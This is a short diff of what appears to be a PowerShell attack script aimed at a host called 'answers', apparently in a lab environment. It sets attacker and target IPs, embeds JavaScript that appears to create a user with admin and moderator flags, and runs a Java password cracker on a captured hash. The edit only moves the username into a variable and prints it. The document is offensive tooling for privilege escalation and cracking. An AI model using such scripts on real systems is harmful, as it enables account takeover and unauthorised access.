@@ -1,11 +1,12 @@
 $attacker_ip = '192.168.119.123';
 $target_ip = '192.168.123.251';
+$username = 'zinhart';
 $javascript = @"
 const attacker_ip = '$attacker_ip';
 const host = 'answers';
 const host_ip = '$target_ip';
 
-username = "zinhart"
+username = '$username'
 email = "zinhart@cucked.com"
 isAdmin = "true"
 isMod = "true"
@@ -118,6 +119,7 @@ while($True) {
 
 
 ## run password cracker
+write-output "Username: $username";
 javac PasswordCracker.java;
 java PasswordCracker.java "$start_time" "$end_time" "$hash"
 #$server_logs
